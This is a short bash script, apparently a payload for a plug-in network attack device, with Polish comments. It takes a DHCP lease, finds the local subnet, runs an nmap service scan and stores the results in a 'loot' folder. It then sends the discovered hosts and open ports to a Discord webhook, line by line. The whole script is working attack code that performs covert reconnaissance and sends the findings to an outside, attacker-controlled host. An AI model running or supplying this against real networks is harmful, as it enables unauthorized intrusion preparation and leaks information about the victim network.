#!/bin/bash
# Nmap Autoscan – switch=1, udhcpc + nmap + Discord webhook

DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/TWOJ_WEBHOOK_URL"
LOOT_DIR="/mnt/loot/nmap"
REPORT_FILE="$LOOT_DIR/scan_$(date +%H%M%S).txt"

send_to_discord() {
    local msg="$1"
    wget -q --no-check-certificate --header='Content-Type: application/json' \
         --post-data="$(printf '{"content": "%s"}' "$msg")" \
         "$DISCORD_WEBHOOK_URL" -O /dev/null
}

LED SETUP
mkdir -p "$LOOT_DIR"

udhcpc -i eth1 -n -q -t 5
sleep 2

TARGET_NET=$(ip route | grep eth1 | grep -v default | awk '{print $1}')
if [ -z "$TARGET_NET" ]; then
    TARGET_NET=$(ip route | grep eth0 | grep -v default | awk '{print $1}')
fi
if [ -z "$TARGET_NET" ]; then
    echo "Błąd: Nie wykryto sieci do skanowania!"
    LED R FAIL
    exit 1
fi

send_to_discord "🚀 **Nmap Autoscan startuje!** Cel: $TARGET_NET"
LED ATTACK

nmap -F -sV -T4 "$TARGET_NET" > "$REPORT_FILE"

SUMMARY=$(grep "Nmap scan report" "$REPORT_FILE" | wc -l)
send_to_discord "✅ Skan zakończony. Znaleziono **$SUMMARY** urządzeń."

grep -E 'Nmap scan report|open' "$REPORT_FILE" | grep -v "SF-" | while read -r line; do
    send_to_discord "$line"
    sleep 0.5
done

sync
LED G SUCCESS
sleep 2
LED OFF
